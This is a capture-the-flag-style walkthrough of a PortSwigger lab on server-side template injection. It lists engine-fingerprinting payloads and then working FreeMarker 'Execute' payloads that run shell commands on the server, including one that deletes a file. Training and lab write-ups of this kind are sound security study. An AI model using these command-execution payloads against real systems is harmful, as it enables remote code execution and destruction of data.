@@ -1,0 +1,36 @@
+The payloads below are meant to solve the following lab:
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
+
+Logging into the content managers account with the following credentials content-manager:C0nt3ntM4n4g3r will give us access to edit the templates used in the blog posts.
+
+Trying to identify the template engine with the template decision tree at https://portswigger.net/web-security/images/template-decision-tree.png and the three following payloads, will lead to "Unknown". 
+
+Payload: ${7*7}
+Response: 49
+
+Payload: a{*comment*}b
+Response: a{*comment*}b
+
+Payload: ${"z".join("ab")}
+Response: nothing
+
+Since we still don't know what template engine is used, we can try to induce an error and hope that more information is leaked in the process.
+
+Payload: ${7/0}
+Response: ERROR, Freemarker stack trace.
+
+Now that we know the template engine is freemarker we can look up sample injections on hacktricks by visiting the following link:
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java
+
+Now we can test whether we can inject a system command by using the following payload:
+Payload: ${"freemarker.template.utility.Execute"?new()("id")}
+Response: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
+
+Next we can look for the morale.txt file in the current directory with the following payload:
+Payload: ${"freemarker.template.utility.Execute"?new()("ls")}
+Response: morale.txt
+
+All that's left now is to delete the morale.txt file with the following payload:
+Payload: ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
+Response: Nothing, file is deleted.
+
